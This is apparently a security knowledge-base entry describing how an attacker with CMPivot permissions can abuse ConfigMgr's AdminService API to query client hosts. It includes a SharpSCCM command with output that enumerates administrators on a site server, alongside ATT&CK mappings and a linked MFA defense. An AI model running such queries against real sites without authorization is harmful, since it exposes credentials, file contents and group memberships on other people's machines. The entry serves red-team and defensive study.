# Leverage CMPivot to Query Information from Clients
## Code Name
- RECON-4

## ATT&CK TTPs
- [TA0009](https://attack.mitre.org/tactics/TA0009/) - Collection
- [TA0010](https://attack.mitre.org/tactics/TA0010/) - Exfiltration
- [TA0043](https://attack.mitre.org/tactics/TA0043/) - Reconnaissance

## Required Privilege / Context
- Run CMPivot permission on the Collection scope
- Read permission on Collections
- Read permission on Inventory Reports
- Read permission on the SMS Scripts object (n/a after version 2107)
- The default scope (n/a after version 2107)
- Target clients require a minimum of PowerShell version 4
- Additional details: https://learn.microsoft.com/en-us/mem/configmgr/core/servers/manage/cmpivot#permissions

## Summary
CMPivot is part of the ConfigMgr framwework. It allows for real time collection of data from client hosts.

The data collected is based on different queries available as part of the framework. Queries are made using the Kusto Query Language (KQL) and allows for different filters to be applied to the data received.

These queries allow CMPivot users to pull data like Windows event logs, registry values, file contens, local group information, etc.

The most common usage of CMPivot is done through a GUI. From the CMPivot window we can:
1. In the SCCM Manager console select the target/s to run queries against (Single resource or a collection)
2. Select the query from the left pane or enter it manually in the query pane plus any desired filters
3. Run the query on the target client or collection
4. Results pane displays the data returned

In the background the data obtained from these queries is gathered either through WMI or by running a Powershell script on the client/s (Powershell script is run as SYSTEM on targets)
   
Additionally ConfigMgr exposes the AdminService REST API which in turn exposes methods to perform CMPivot queries.

https://{managementPoint}/AdminService/v1.0/Device({deviceId})/AdminService.RunCMPivot

AdminService also allows for retriving the results of our queries.

https://{managementPoint}/AdminService/v1.0/Collections('{collectionName}')/AdminService.RunCMPivot


## Impact
With the required permissions an attacker can leverage CMPivot + AdminService to deploy operations to client hosts within a ConfigMgr site.

Some of these operations allow for enumeration of:

  - Active sessions
  - Registry keys and values
  - Local administrator group
  - Arbitrary file contents
  - Windows event logs

And a lot more. There are more than 130 queries available

## Defensive IDs
- [PREVENT-9: Enforce MFA for SMS provider calls](../../../defense-techniques/PREVENT/PREVENT-9/prevent-9_description.md)

## Examples

- Using SharpSCCM to enumerate local administrators group from the ConfigMgr client with ID 16777226
```
.\SharpSCCM.exe invoke admin-service -r 16777226 -q "Administrators" -sms site-sms -d 10

[+] Sending query to AdminService
[+] URL: "https://site-sms/AdminService/v1.0/Device(16777226)/AdminService.RunCMPivot"
[+] OperationId found: 16777463
[+] Attempt 1 of 5: Checking for query operation to complete
[+] URL: "https://site-sms/AdminService/v1.0/Device(16777226)/AdminService.CMPivotResult(OperationId=16777463)"
[+] 10 seconds until next attempt
[+] Attempt 2 of 5: Checking for query operation to complete
[+] URL: "https://site-sms/AdminService/v1.0/Device(16777226)/AdminService.CMPivotResult(OperationId=16777463)"
[+] 10 seconds until next attempt
[+] Successfully retrieved results from AdminService
Device: SITE-SERVER
ObjectClass: User
Name: MAYYHEM\CAS$
PrincipalSource: ActiveDirectory
----------------------------------------
Device: SITE-SERVER
ObjectClass: Group
Name: MAYYHEM\Domain Admins
PrincipalSource: ActiveDirectory
----------------------------------------
Device: SITE-SERVER
ObjectClass: User
Name: MAYYHEM\sccmadmin
PrincipalSource: ActiveDirectory
----------------------------------------
Device: SITE-SERVER
ObjectClass: User
Name: SITE-SERVER\Administrator
PrincipalSource: Local
----------------------------------------
[+] Completed execution in 00:00:21.1354974
```

## References
- Microsoft, CMPivot for real-time data in Configuration manger, https://learn.microsoft.com/en-us/mem/configmgr/core/servers/manage/cmpivot
- Benoit Lecours, SCCM CMPivot Query Examples, https://www.systemcenterdudes.com/sccm-cmpivot-query/
- Microsoft, What is the administration service in ConfigMgr, https://learn.microsoft.com/en-us/mem/configmgr/develop/adminservice/overview
- Diego Lomellini, Lateral Movement without Lateral Movement, https://posts.specterops.io/lateral-movement-without-lateral-movement-brought-to-you-by-configmgr-9b79b04634c7
